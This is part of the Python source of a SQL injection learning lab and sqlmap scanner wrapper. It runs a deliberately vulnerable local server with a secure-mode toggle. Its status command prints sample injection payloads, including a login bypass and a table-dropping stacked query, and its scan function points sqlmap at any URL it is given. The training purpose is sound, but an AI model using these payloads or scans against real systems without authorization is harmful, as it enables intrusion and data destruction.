        self.scans_dir = os.path.join(self.workspace, "scans")
        self.lab = SQLInjectionLab(self.console)
        os.makedirs(self.scans_dir, exist_ok=True)
        self.sqlmap_cmd, self.use_bundled = self._locate_sqlmap()
        self.server_thread = None
    
    def _get_app_dir(self) -> str:
        if getattr(sys, "frozen", False):
            return os.path.dirname(sys.executable)
        return os.path.dirname(os.path.abspath(__file__))
    
    def _locate_sqlmap(self):
        bundled_path = os.path.join(self.app_dir, "tools", "sqlmap", "sqlmap.py")
        if os.path.isfile(bundled_path):
            if self.verbose and self.console:
                self.console.print("[green]Using bundled SQLMap[/green]")
            return [sys.executable, bundled_path], True
        
        sqlmap_path = which("sqlmap")
        if sqlmap_path:
            if self.verbose and self.console:
                self.console.print(f"[green]Found SQLMap in PATH: {sqlmap_path}[/green]")
            return [sqlmap_path], False
        
        common_paths = [
            os.path.expanduser("~/.local/bin/sqlmap"),
            os.path.expanduser("~/AppData/Roaming/Python/Python311/Scripts/sqlmap.exe"),
            os.path.expanduser("~/AppData/Roaming/Python/Python310/Scripts/sqlmap.exe"),
            "C:\\Python3\\Scripts\\sqlmap.exe",
            "C:\\Python\\Scripts\\sqlmap.exe",
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                if self.verbose and self.console:
                    self.console.print(f"[green]Found SQLMap at: {path}[/green]")
                return [path], False
        
        if self.console:
            self.console.print("[red]SQLMap not found![/red]")
            self.console.print("[yellow]Try installing: pip install sqlmap[/yellow]")
            self.console.print("[yellow]Or download from: https://sqlmap.org/[/yellow]")
        return [], False
    
    def install_sqlmap(self):
        if self.console:
            self.console.print("[yellow]Installing SQLMap...[/yellow]")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "sqlmap"])
            if self.console:
                self.console.print("[green]SQLMap installed successfully![/green]")
                self.sqlmap_cmd, self.use_bundled = self._locate_sqlmap()
            return True
        except Exception as e:
            if self.console:
                self.console.print(f"[red]Installation failed: {e}[/red]")
            return False
    
    def start_lab(self, port: int = 8080, open_browser: bool = True):
        if not self.console:
            print("Rich library required for the lab")
            return
        
        if self.lab.running:
            self.console.print(f"[yellow]Lab is already running on http://localhost:{self.lab.port}[/yellow]")
            return
        
        self.console.print("\n[bold cyan]Starting SQL Injection Learning Lab...[/bold cyan]")
        self.console.print(f"[dim]Server running on: http://localhost:{port}[/dim]")
        self.console.print("[dim]Use 'sqllab-stop' to stop the server[/dim]")
        self.console.print("[dim]Initializing server...[/dim]")
        
        LabHTTPHandler.lab_instance = self.lab
        
        try:
            server_address = ('', port)
            self.lab.server = HTTPServer(server_address, LabHTTPHandler)
            self.lab.port = port
            self.lab.running = True
        except Exception as e:
            self.console.print(f"[red]Failed to start server: {e}[/red]")
            return
        
        def run_server():
            try:
                self.lab.server.serve_forever()
            except Exception as e:
                if self.console:
                    self.console.print(f"[dim]Server thread: {e}[/dim]")
            finally:
                self.lab.running = False
        
        self.server_thread = threading.Thread(target=run_server, daemon=True)
        self.server_thread.start()
        
        time.sleep(1)
        self._print_lab_info()
        
        if open_browser:
            try:
                self.console.print("[green]Opening browser...[/green]")
                def open_browser_later():
                    time.sleep(0.5)
                    webbrowser.open(f"http://localhost:{port}")
                
                browser_thread = threading.Thread(target=open_browser_later, daemon=True)
                browser_thread.start()
                self.console.print("[green]Browser should open shortly[/green]")
            except Exception as e:
                self.console.print(f"[dim]Could not open browser: {e}[/dim]")
                self.console.print(f"[cyan]Please open manually: http://localhost:{port}[/cyan]")
        
        self.console.print("[green]Lab started successfully![/green]")
        self.console.print(f"[cyan]http://localhost:{port}[/cyan]")
        self.console.print("[dim]Use 'sqllab-status' to check status[/dim]")
        self.console.print("[dim]Use 'sqllab-stop' to stop the server[/dim]")
    
    def stop_lab(self):
        if not self.lab.running or not self.lab.server:
            if self.console:
                self.console.print("[yellow]Lab is not running[/yellow]")
            return
        
        if self.console:
            self.console.print("[yellow]Stopping SQL Injection Learning Lab...[/yellow]")
        
        try:
            self.lab.server.shutdown()
            self.lab.server.server_close()
            self.lab.running = False
            if self.console:
                self.console.print("[green]Lab server stopped[/green]")
        except Exception as e:
            if self.console:
                self.console.print(f"[red]Error stopping server: {e}[/red]")
    
    def _print_lab_info(self):
        if not self.console:
            return
        
        users = self.lab.get_users()
        
        info = f"""
[bold green]Lab Information:[/bold green]

[bold yellow]Available Users:[/bold yellow]
"""
        for user in users[:5]:
            info += f"  - [cyan]{user['username']}[/cyan] (Role: {user['role']}, Dept: {user['department']})\n"
        if len(users) > 5:
            info += f"  - ... and {len(users) - 5} more users\n"
        
        info += f"""
[bold yellow]Admin Credentials:[/bold yellow]
  Username: [bold cyan]{self.lab.current_credentials['username']}[/bold cyan]
  Password: [bold cyan]{self.lab.current_credentials['password']}[/bold cyan]

[bold yellow]SQL Injection Techniques Available:[/bold yellow]
"""
        for tech_id, tech_data in SQL_INJECTION_TECHNIQUES.items():
            info += f"  - [cyan]{tech_data['name']}[/cyan] - {tech_data['description'][:40]}...\n"
        
        info += f"""
[bold yellow]Secure Mode:[/bold yellow]
  Enabled: {self.lab.secure_mode}
  To enable: Use the "Enable Secure Mode" button in the dashboard

[bold yellow]Database Stats:[/bold yellow]
  Users: {len(users)}
  Products: {len(self.lab.get_all_products())}
  Logs: {len(self.lab.get_logs(100))}

[bold yellow]Learning Objectives:[/bold yellow]
  Click the "Show Learning Center" button on the login page!
  NB: When you use SQL injection, the login creates a session with the injected username (like ' OR '1'='1' --), but when you try to use SQL injection again after logging out, it's trying to find a user with that exact username you previously/recently used in the database.
  Therefore, exit the browser and return to the Dsterminal Console and reset the database using 'sqlmap-reset or sqlmap-db-reset' and hit enter.
  After resetting the database, you refresh the database ready for new session and ready to login again using sql injection string. That's where a magic of SQLmap Injection technique comes from.
  In real systems, you cannot refresh the database since you're working at other end of the system and SQLmap injection does not bear that, it continues injecting until you're authenticated or use other payloads.
  Download PDF notes for offline reference.
"""
        self.console.print(Panel(info, title="[bold cyan]SQL INJECTION LEARNING LAB[/bold cyan]", border_style="cyan"))
    
    def scan(self, url: str, options: str = ""):
        if not self.console:
            return
        
        if not self.sqlmap_cmd:
            self.console.print("[red]SQLMap not available. Install with: sqlmap-install[/red]")
            return
        
        self.console.print(f"\n[bold cyan]Running SQLMap scan on: {url}[/bold cyan]")
        self.console.print("=" * 60)
        
        cmd = self.sqlmap_cmd.copy()
        cmd.extend(['-u', url])
        
        if options:
            cmd.extend(options.split())
        
        if '--batch' not in options:
            cmd.append('--batch')
        if '--random-agent' not in options:
            cmd.append('--random-agent')
        if '--level' not in options:
            cmd.extend(['--level', '3'])
        if '--risk' not in options:
            cmd.extend(['--risk', '2'])
        
        self.console.print(f"[dim]Command: {' '.join(cmd)}[/dim]")
        self.console.print("[yellow]This may take several minutes...[/yellow]")
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            for line in process.stdout:
                line = line.strip()
                if line:
                    if 'vulnerable' in line.lower() or 'injectable' in line.lower():
                        self.console.print(f"[green]{line}[/green]")
                    elif 'error' in line.lower() or 'failed' in line.lower():
                        self.console.print(f"[red]{line}[/red]")
                    elif 'warning' in line.lower():
                        self.console.print(f"[yellow]{line}[/yellow]")
                    elif 'found' in line.lower() or 'database' in line.lower():
                        self.console.print(f"[cyan]{line}[/cyan]")
                    else:
                        self.console.print(f"[dim]{line}[/dim]")
            
            process.wait()
            
            if process.returncode == 0:
                self.console.print("\n[green]SQLMap scan completed successfully![/green]")
            else:
                self.console.print(f"\n[red]SQLMap scan failed with code: {process.returncode}[/red]")
                
        except Exception as e:
            self.console.print(f"[red]Error running SQLMap: {e}[/red]")
    
    def cmd_sqlmap_status(self, args):
        try:
            lab = self.lab
            users = lab.get_users()
            products = lab.get_all_products()
            logs = lab.get_logs(100)
            attempts = lab.get_injection_attempts(10)
            
            self.console.print("\n[bold cyan]SQL Injection Lab Status[/bold cyan]")
            self.console.print("=" * 60)
            
            if lab.running:
                self.console.print("[green]Server: RUNNING[/green]")
                self.console.print(f"[yellow]URL:[/yellow] http://localhost:{lab.port}")
            else:
                self.console.print("[red]Server: STOPPED[/red]")
                self.console.print("[dim]  Use 'sqllab' to start the server[/dim]")
            
            self.console.print("")
            
            if lab.secure_mode:
                self.console.print("[green]Secure Mode: ENABLED[/green]")
                self.console.print("[dim]  SQL injection is PREVENTED (parameterized queries)[/dim]")
            else:
                self.console.print("[red]Secure Mode: DISABLED[/red]")
                self.console.print("[dim]  SQL injection is POSSIBLE (vulnerable)[/dim]")
            
            self.console.print("")
            self.console.print(f"[yellow]Total Users:[/yellow] {len(users)}")
            self.console.print(f"[yellow]Total Products:[/yellow] {len(products)}")
            self.console.print(f"[yellow]Logs:[/yellow] {len(logs)}")
            self.console.print(f"[yellow]Injection Attempts:[/yellow] {len(attempts)}")
            
            if attempts:
                successful = sum(1 for a in attempts if a['success'])
                self.console.print(f"[yellow]Successful Injections:[/yellow] {successful}")
                self.console.print(f"[yellow]Failed Injections:[/yellow] {len(attempts) - successful}")
            
            self.console.print("")
            self.console.print("[yellow]Admin Credentials:[/yellow]")
            self.console.print(f"  [cyan]Username:[/cyan] {lab.current_credentials['username']}")
            self.console.print(f"  [cyan]Password:[/cyan] {lab.current_credentials['password']}")
            
            self.console.print("")
            self.console.print("[yellow]SQL Injection Examples:[/yellow]")
            self.console.print("  [cyan]Basic:[/cyan] [red]' OR '1'='1' --[/red]")
            self.console.print("  [cyan]Union:[/cyan] [red]' UNION SELECT 1,2,3,4,5,6,7,8 --[/red]")
            self.console.print("  [cyan]Time-based:[/cyan] [red]' AND SLEEP(5) --[/red]")
            self.console.print("  [cyan]Stacked:[/cyan] [red]'; DROP TABLE users --[/red]")
            
            self.console.print("")
            self.console.print("[dim]Commands:[/dim]")
            self.console.print("[dim]  sqllab - Start the lab[/dim]")
            self.console.print("[dim]  sqllab-stop - Stop the lab[/dim]")
            self.console.print("[dim]  sqlmap-secure - Toggle secure mode[/dim]")
            self.console.print("[dim]  sqlmap-techniques - View all techniques[/dim]")
            self.console.print("[dim]  sqlmap-pdf - Download PDF notes[/dim]")
            self.console.print("[dim]  sqlmap-scan <url> - Run SQLMap scan[/dim]")
            self.console.print("=" * 60)
            
        except Exception as e:
            self.console.print(f"[red]Error retrieving status: {e}[/red]")
            
    def cmd_sqlmap_techniques(self, args):
        if not self.console:
            return
        
        self.console.print("\n[bold cyan]SQL Injection Techniques Reference[/bold cyan]")
        self.console.print("=" * 60)
        
        for tech_id, tech_data in SQL_INJECTION_TECHNIQUES.items():
            self.console.print(f"\n[bold yellow]{tech_data['name']}[/bold yellow]")
            self.console.print(f"[dim]{tech_data['description']}[/dim]")
            self.console.print(f"[cyan]Example:[/cyan] {tech_data['example']}")
            self.console.print(f"[green]Explanation:[/green] {tech_data['explanation'][:100]}...")
            self.console.print(f"[dim]Payloads: {len(tech_data['payloads'])}[/dim]")
            self.console.print("-" * 40)
    
    def cmd_sqlmap_pdf(self, args):
        if not self.console:
            return
        
        self.console.print("\n[bold cyan]Generating PDF Notes...[/bold cyan]")
        
        if not REPORTLAB_AVAILABLE:
            self.console.print("[red]ReportLab not installed. Install with: pip install reportlab[/red]")
            return
        
        pdf_path = self.lab.generate_pdf_notes()
        
        if pdf_path:
            self.console.print(f"[green]PDF Notes generated: {pdf_path}[/green]")
            self.console.print(f"[dim]Location: {pdf_path}[/dim]")
            
            try:
                webbrowser.open(f"file://{pdf_path}")
                self.console.print("[green]PDF opened in default viewer[/green]")
            except:
                pass
        else:
            self.console.print("[red]PDF generation failed.[/red]")
    
    def cmd_sqlmap_secure(self, args):
        self.lab.set_secure_mode(not self.lab.secure_mode)
        if self.console:
            status = "ENABLED" if self.lab.secure_mode else "DISABLED"
            self.console.print(f"[green]Secure mode: {status}[/green]")


# ============================================================
# COMMAND LINE INTERFACE
# ============================================================

def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='SQLMap Scanner & Learning Lab - DSTERMINAL Enterprise Edition',
        epilog='Example: python sqlmap_scanner.py -u http://testphp.vulnweb.com/artists.php?artist=1'
    )
    parser.add_argument('-u', '--url', help='Target URL (with http:// or https://)')
    parser.add_argument('--lab', action='store_true', help='Start the SQL Injection Learning Lab')
    parser.add_argument('--lab-port', type=int, default=8080, help='Port for the lab server (default: 8080)')
    parser.add_argument('--no-browser', action='store_true', help='Don\'t open browser automatically')
    parser.add_argument('--install', action='store_true', help='Install SQLMap and exit')
    parser.add_argument('--secure', action='store_true', help='Start lab in secure mode')
    parser.add_argument('--reset', action='store_true', help='Reset the lab database')
    parser.add_argument('--quiet', action='store_true', help='Minimal output')
    parser.add_argument('--pdf', action='store_true', help='Generate PDF notes only')
    parser.add_argument('--scan', help='Run SQLMap scan on URL (with options)')
    
    args = parser.parse_args()
    
    scanner = SQLMapScanner(verbose=not args.quiet)
    
    if args.pdf:
        scanner.cmd_sqlmap_pdf(None)
        return
    
    if args.install:
        scanner.install_sqlmap()
        return
    
    if args.reset:
        scanner.lab.reset_database()
        return
    
    if args.secure:
        scanner.lab.set_secure_mode(True)
    
    if args.lab:
        scanner.start_lab(port=args.lab_port, open_browser=not args.no_browser)
        try:
            while scanner.lab.running:
                time.sleep(0.5)
        except KeyboardInterrupt:
            scanner.stop_lab()
        return
    
    if args.url:
        scanner.scan(args.url, args.scan or "")
    else:
        console = Console() if RICH_AVAILABLE else None
        if console:
            console.print("\n[bold cyan]DSTERMINAL SQL Injection Suite[/bold cyan]")
            console.print("[1] Run SQLMap scan")
            console.print("[2] Start SQL Injection Learning Lab")
            console.print("[3] Reset lab database")
            console.print("[4] Toggle secure mode")
            console.print("[5] Show lab status")
            console.print("[6] View SQL Injection Techniques")
            console.print("[7] Generate PDF Notes")
            console.print("[8] Install SQLMap")
            console.print("[9] Exit")
            
            choice = console.input("\n[bold green]Select option: [/]").strip()
            
            if choice == '1':
                url = console.input("Target URL: ").strip()
                options = console.input("Extra options (e.g., --level 3 --risk 2): ").strip()
                scanner.scan(url, options)
            elif choice == '2':
                scanner.start_lab(port=args.lab_port, open_browser=not args.no_browser)
                try:
                    while scanner.lab.running:
                        time.sleep(0.5)
                except KeyboardInterrupt:
                    scanner.stop_lab()
            elif choice == '3':
                scanner.lab.reset_database()
            elif choice == '4':
                scanner.cmd_sqlmap_secure(None)
            elif choice == '5':
                scanner.cmd_sqlmap_status(None)
            elif choice == '6':
                scanner.cmd_sqlmap_techniques(None)
            elif choice == '7':
                scanner.cmd_sqlmap_pdf(None)
            elif choice == '8':
                scanner.install_sqlmap()
            else:
                print("Goodbye!")
        else:
            scanner.scan(args.url or "")


if __name__ == "__main__":
    main()